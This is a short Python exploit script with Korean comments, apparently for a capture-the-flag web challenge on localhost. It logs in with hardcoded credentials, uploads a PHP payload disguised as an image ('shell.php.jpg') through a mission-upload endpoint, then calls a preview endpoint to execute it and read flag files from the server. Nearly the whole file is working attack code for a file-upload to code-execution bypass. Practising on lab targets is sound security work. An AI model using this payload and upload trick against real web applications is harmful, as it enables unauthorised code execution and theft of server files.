import requests
from io import BytesIO

# 설정
TARGET = "http://localhost:5000"
EMAIL = "user@frontier.com"
PASSWORD = "qwer1234"

# PHP 페이로드
PHP_PAYLOAD = """<?php
$paths = [
    '/var/ctf/flag',
    '/app/flag.txt',
    __DIR__ . '/../../flag.txt'
];

foreach ($paths as $path) {
    if (file_exists($path) && is_readable($path)) {
        echo file_get_contents($path);
        exit;
    }
}
echo "Flag not found";
?>"""

def exploit():
    session = requests.Session()
    
    # 1. 로그인
    print("[*] 로그인 중...")
    login_data = {"email": EMAIL, "password": PASSWORD}
    r = session.post(f"{TARGET}/login", data=login_data, allow_redirects=False)
    
    if r.status_code != 302:
        print(f"[-] 로그인 실패: {r.status_code}")
        return
    
    print("[+] 로그인 성공")
    
    # 2. 파일 업로드
    print("[*] shell.php.jpg 업로드 중...")
    files = {'missionImage': ('shell.php.jpg', BytesIO(PHP_PAYLOAD.encode()), 'image/jpeg')}
    data = {
        'title': 'Test',
        'shortDesc': 'Test',
        'detailDesc': 'Test',
        'coins': '100'
    }
    
    r = session.post(f"{TARGET}/api/missions/upload", files=files, data=data, allow_redirects=False)
    
    if r.status_code not in [200, 302]:
        print(f"[-] 업로드 실패: {r.status_code}")
        print(r.text)
        return
    
    print("[+] 업로드 성공")
    
    # 3. 업로드된 파일명 찾기
    print("[*] 파일명 확인 중...")
    r = session.get(f"{TARGET}/api/missions")
    missions = r.json()
    
    if not missions or not missions[0].get('img_url'):
        print("[-] 파일명을 찾을 수 없습니다")
        return
    
    filename = missions[0]['img_url'].split('/')[-1]
    print(f"[+] 파일명: {filename}")
    
    # 4. PHP 실행
    print("[*] PHP 실행 중...")
    r = session.get(f"{TARGET}/api/missions/preview/{filename}")
    
    print("\n" + "="*60)
    print(r.text)
    print("="*60)

if __name__ == "__main__":
    exploit()